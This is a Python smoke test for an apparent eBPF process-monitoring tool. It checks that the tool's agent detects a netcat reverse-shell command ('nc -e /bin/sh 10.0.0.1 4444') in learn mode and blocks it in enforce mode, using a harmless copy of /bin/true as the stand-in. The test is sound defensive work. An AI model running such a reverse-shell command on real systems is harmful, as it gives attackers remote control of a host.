#!/usr/bin/env python3
"""End-to-end smoke test: hub + agent + libbpf loader on the running kernel.

Run from the repo root, as root, inside a DISPOSABLE VM or sandbox:
    timeout 120 python3 tests/e2e_smoke.py
Exit code 0 = all checks passed. Learn mode is used first; Enforce is only switched on
for the operator-block check, and only a harmless copy of /bin/true is ever executed.
"""
import http.cookiejar, json, os, shutil, signal, subprocess, sys, tempfile, time, urllib.request

REPO = os.getcwd()

def preflight():
    """Fail early, with a clear reason, when the host cannot run the kernel side."""
    if os.geteuid() != 0:
        sys.exit("preflight: must run as root")
    if not os.path.exists("/sys/kernel/btf/vmlinux"):
        sys.exit("preflight: no /sys/kernel/btf/vmlinux (kernel without BTF)")
    if not os.path.exists("/sys/kernel/tracing/events"):          # fresh sandboxes start without tracefs
        os.makedirs("/sys/kernel/tracing", exist_ok=True)
        subprocess.run(["mount", "-t", "tracefs", "nodev", "/sys/kernel/tracing"], capture_output=True)
        if not os.path.exists("/sys/kernel/tracing/events"):
            sys.exit("preflight: tracefs not mounted and mounting failed")
    for need in ("build/sentinel-loader", "build/sentinel_lineage_core.o"):
        if not os.path.exists(os.path.join(REPO, need)):
            sys.exit(f"preflight: {need} missing: run `make build` first")

preflight()
T = tempfile.mkdtemp(prefix="sentinel-e2e-")
PORT = "5055"
# Work on COPIES of config so API writes never touch the repo's files.
shutil.copy(f"{REPO}/config/rules.yaml", f"{T}/rules.yaml")
shutil.copy(f"{REPO}/config/geo_rules.json", f"{T}/geo_rules.json")
env = dict(os.environ, PYTHONUNBUFFERED="1", SENTINEL_PORT=PORT, SENTINEL_AGENT_KEY="agentkey",
           SENTINEL_SESSION_SECRET="s3cret", SENTINEL_ALLOWLIST_KEY="allowkey", SENTINEL_ADMIN_PASSWORD="pw",
           SENTINEL_DB_PATH=f"{T}/hub.db", SENTINEL_DB=f"{T}/hub.json", SENTINEL_AGENT_DB=f"{T}/agent.json",
           SENTINEL_CONFIG=f"{T}/rules.yaml", SENTINEL_GEO_RULES=f"{T}/geo_rules.json",
           SENTINEL_SYNC_INTERVAL="2", SENTINEL_COLLECTOR_URL=f"http://127.0.0.1:{PORT}/api/v1/telemetry",
           SENTINEL_LOADER=f"{REPO}/build/sentinel-loader")

results = []
def check(name, ok):
    results.append(ok); print(f"  {'PASS' if ok else 'FAIL'}  {name}", flush=True)

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
def call(path, data=None, key=False, csrf=None):
    h = {"Content-Type": "application/json"}
    if key: h["X-Sentinel-Key"] = "agentkey"
    if csrf: h["X-CSRF-Token"] = csrf
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}{path}", headers=h,
                                 data=json.dumps(data).encode() if data is not None else None)
    return json.loads(opener.open(req, timeout=5).read() or b"{}")

hub = agent = None
try:
    hub = subprocess.Popen([sys.executable, "collector/sentinel_hub_lineage.py"], env=env,
                           stdout=open(f"{T}/hub.log", "w"), stderr=subprocess.STDOUT)
    time.sleep(3)
    csrf = call("/api/v1/login", {"username": "admin", "password": "pw"})["csrf"]
    call("/api/v1/mode", {"mode": "learn"}, csrf=csrf)

    agent = subprocess.Popen([sys.executable, "agent/sentinel_lineage_agent.py"], env=env,
                             stdout=open(f"{T}/agent.log", "w"), stderr=subprocess.STDOUT)
    time.sleep(5)
    log = open(f"{T}/agent.log").read()
    check("agent is running", agent.poll() is None)
    check("loader reported ready", "Loader ready" in log)

    shutil.copy("/bin/true", "/tmp/nc")                    # harmless stand-in for netcat
    out = subprocess.run(["/bin/sh", "-c", "/bin/ls /tmp >/dev/null; /tmp/nc -e /bin/sh 10.0.0.1 4444; echo nc_exit=$?"],
                         capture_output=True, text=True).stdout
    check("Learn mode: the matching command was NOT killed", "nc_exit=0" in out)
    time.sleep(4)

    tl = call("/api/v1/telemetry", key=True)
    events = tl if isinstance(tl, list) else tl.get("events", tl.get("telemetry", []))
    hit = [e for e in events if str(e.get("rule_id")) == "1001"]
    check("hub received events from the agent", len(events) > 0)
    check("rule 1001 (reverse shell, nc -e) detected", bool(hit))
    check("detection reported as not killed in Learn mode", bool(hit) and not hit[0].get("killed"))

    if hit:
        lin = hit[0]["lineage_id"]
        call("/api/v1/mode", {"mode": "enforce"}, csrf=csrf)
        call(f"/api/v1/lineage/{lin}/block", {}, csrf=csrf)
        time.sleep(5)
        check("operator block from the dashboard reached the agent",
              "BLOCKED lineage" in open(f"{T}/agent.log").read())
finally:
    for p in (agent, hub):
        if p and p.poll() is None: p.send_signal(signal.SIGTERM)
    time.sleep(2)
    subprocess.run(["pkill", "-x", "sentinel-loader"])
    for p in (agent, hub):
        if p and p.poll() is None: p.kill()
    try: os.remove("/tmp/nc")
    except OSError: pass
    print(f"\nlogs kept in {T}")
print(f"\n{sum(results)}/{len(results)} checks passed")
sys.exit(0 if results and all(results) else 1)
